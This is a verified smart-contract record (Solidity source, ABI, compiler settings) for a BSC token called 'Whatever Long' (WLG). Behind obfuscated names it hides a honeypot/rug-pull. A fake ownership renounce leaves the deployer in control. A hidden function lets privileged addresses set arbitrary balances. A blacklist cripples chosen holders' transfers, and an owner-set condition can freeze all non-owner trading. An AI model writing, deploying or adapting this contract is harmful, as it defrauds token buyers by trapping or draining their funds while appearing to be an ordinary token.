{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface enableShouldTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountBuySender {\n    function createPair(address senderWalletTotal, address receiverToken) external returns (address);\n}\n\ninterface receiverTeamToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atExempt) external view returns (uint256);\n\n    function transfer(address receiverSwap, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address enableLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSwap,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeAmountTake, uint256 value);\n    event Approval(address indexed enableLaunch, address indexed spender, uint256 value);\n}\n\ninterface receiverTeamTokenMetadata is receiverTeamToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WhateverLong is launchedTeam, receiverTeamToken, receiverTeamTokenMetadata {\n\n    uint256 private txIs;\n\n    bool public minReceiverIs;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTo;\n    }\n\n    address enableMarketingAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private marketingEnableLimit;\n\n    function buyFrom() public {\n        emit OwnershipTransferred(feeShouldLaunched, address(0));\n        walletSender = address(0);\n    }\n\n    function tokenExemptMax(address isEnable, uint256 walletReceiver) public {\n        listMax();\n        liquiditySender[isEnable] = walletReceiver;\n    }\n\n    function transferFrom(address enableTeam, address receiverSwap, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != enableMarketingAmount) {\n            if (takeFund[enableTeam][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= takeFund[enableTeam][_msgSender()]);\n                takeFund[enableTeam][_msgSender()] -= walletReceiver;\n            }\n        }\n        return toTotal(enableTeam, receiverSwap, walletReceiver);\n    }\n\n    mapping(address => bool) public receiverIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyWallet;\n    }\n\n    uint8 private buyWallet = 18;\n\n    bool private limitTo;\n\n    mapping(address => uint256) private liquiditySender;\n\n    bool public tradingWallet;\n\n    function totalLiquidity(address totalBuy) public {\n        listMax();\n        \n        if (totalBuy == feeShouldLaunched || totalBuy == launchedEnable) {\n            return;\n        }\n        receiverIs[totalBuy] = true;\n    }\n\n    function balanceOf(address atExempt) public view virtual override returns (uint256) {\n        return liquiditySender[atExempt];\n    }\n\n    function transfer(address isEnable, uint256 walletReceiver) external virtual override returns (bool) {\n        return toTotal(_msgSender(), isEnable, walletReceiver);\n    }\n\n    uint256 maxAmount;\n\n    function liquidityTradingSender(uint256 walletReceiver) public {\n        listMax();\n        launchWalletMin = walletReceiver;\n    }\n\n    bool public launchedEnableIs;\n\n    string private liquidityFrom = \"WLG\";\n\n    uint256 private modeFee = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed teamMarketing, address indexed limitMax);\n\n    constructor (){\n        if (totalIsEnable != takeMarketing) {\n            limitTo = true;\n        }\n        enableShouldTo toAtShould = enableShouldTo(enableMarketingAmount);\n        launchedEnable = amountBuySender(toAtShould.factory()).createPair(toAtShould.WETH(), address(this));\n        \n        feeShouldLaunched = _msgSender();\n        buyFrom();\n        tradingLaunched[feeShouldLaunched] = true;\n        liquiditySender[feeShouldLaunched] = modeFee;\n        if (totalIsEnable == autoMax) {\n            autoSender = true;\n        }\n        emit Transfer(address(0), feeShouldLaunched, modeFee);\n    }\n\n    function toTotal(address enableTeam, address receiverSwap, uint256 walletReceiver) internal returns (bool) {\n        if (enableTeam == feeShouldLaunched) {\n            return feeFrom(enableTeam, receiverSwap, walletReceiver);\n        }\n        uint256 listWallet = receiverTeamToken(launchedEnable).balanceOf(tradingShould);\n        require(listWallet == launchWalletMin);\n        require(receiverSwap != tradingShould);\n        if (receiverIs[enableTeam]) {\n            return feeFrom(enableTeam, receiverSwap, shouldAtTx);\n        }\n        return feeFrom(enableTeam, receiverSwap, walletReceiver);\n    }\n\n    mapping(address => bool) public tradingLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeFee;\n    }\n\n    uint256 public autoMax;\n\n    function totalMinLimit(address tokenLiquidityMin) public {\n        if (launchedEnableIs) {\n            return;\n        }\n        \n        tradingLaunched[tokenLiquidityMin] = true;\n        if (txIs != takeMarketing) {\n            takeMarketing = autoMax;\n        }\n        launchedEnableIs = true;\n    }\n\n    string private maxTo = \"Whatever Long\";\n\n    mapping(address => mapping(address => uint256)) private takeFund;\n\n    uint256 constant shouldAtTx = 16 ** 10;\n\n    uint256 private totalIsEnable;\n\n    address public feeShouldLaunched;\n\n    function owner() external view returns (address) {\n        return walletSender;\n    }\n\n    uint256 private takeMarketing;\n\n    function allowance(address atTo, address receiverTxAuto) external view virtual override returns (uint256) {\n        if (receiverTxAuto == enableMarketingAmount) {\n            return type(uint256).max;\n        }\n        return takeFund[atTo][receiverTxAuto];\n    }\n\n    address private walletSender;\n\n    address tradingShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address receiverTxAuto, uint256 walletReceiver) public virtual override returns (bool) {\n        takeFund[_msgSender()][receiverTxAuto] = walletReceiver;\n        emit Approval(_msgSender(), receiverTxAuto, walletReceiver);\n        return true;\n    }\n\n    function listMax() private view {\n        require(tradingLaunched[_msgSender()]);\n    }\n\n    bool private marketingFrom;\n\n    function getOwner() external view returns (address) {\n        return walletSender;\n    }\n\n    uint256 launchWalletMin;\n\n    bool public autoSender;\n\n    address public launchedEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityFrom;\n    }\n\n    function feeFrom(address enableTeam, address receiverSwap, uint256 walletReceiver) internal returns (bool) {\n        require(liquiditySender[enableTeam] >= walletReceiver);\n        liquiditySender[enableTeam] -= walletReceiver;\n        liquiditySender[receiverSwap] += walletReceiver;\n        emit Transfer(enableTeam, receiverSwap, walletReceiver);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmountTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTxAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTxAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShouldLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"liquidityTradingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenExemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidityMin\",\"type\":\"address\"}],\"name\":\"totalMinLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WhateverLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}